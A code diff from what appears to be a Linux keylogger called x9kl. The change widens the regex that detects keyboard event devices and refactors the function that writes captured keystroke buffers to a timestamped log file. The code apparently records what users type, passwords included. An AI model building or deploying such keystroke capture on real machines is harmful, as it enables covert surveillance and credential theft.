@@ -54,7 +54,7 @@ static std::vector<std::string> get_event_files(void) {
 
   {
     std::ifstream file{"/proc/bus/input/devices"};
-    std::regex kb_regex{"H: Handlers=sysrq kbd leds (event\\d{1,2})"};
+    std::regex kb_regex{"H: Handlers=sysrq kbd.*(event\\d{1,2})"};
     std::string line;
 
     while (std::getline(file, line)) {
@@ -143,7 +143,7 @@ static void add_data(const std::vector<uint16_t> &data, std::ofstream &file) {
   file.write((const char *)log_entry.data(), log_entry.size() * 2);
 }
 
-static void write_buffer_to_log(x9kl_ctx_t *ctx) {
+static void write_buffer_to_log(const std::vector<uint16_t> &buffer) {
   struct tm *time;
   char date[9]{0};
 
@@ -163,7 +163,7 @@ static void write_buffer_to_log(x9kl_ctx_t *ctx) {
   }
 
   add_timestamp(time, log_file);
-  add_data(ctx->kb_buffer, log_file);
+  add_data(buffer, log_file);
 }
 
 static void handle_enter(x9kl_ctx_t *ctx) {
@@ -175,7 +175,7 @@ static void handle_enter(x9kl_ctx_t *ctx) {
 
   ctx->kb_buffer.insert(ctx->kb_buffer.begin() + ctx->buffer_cursor, KEY_ENTER);
 
-  write_buffer_to_log(ctx);
+  write_buffer_to_log(ctx->kb_buffer);
   // cleanup
   ctx->kb_buffer.clear();
   ctx->buffer_cursor = 0;
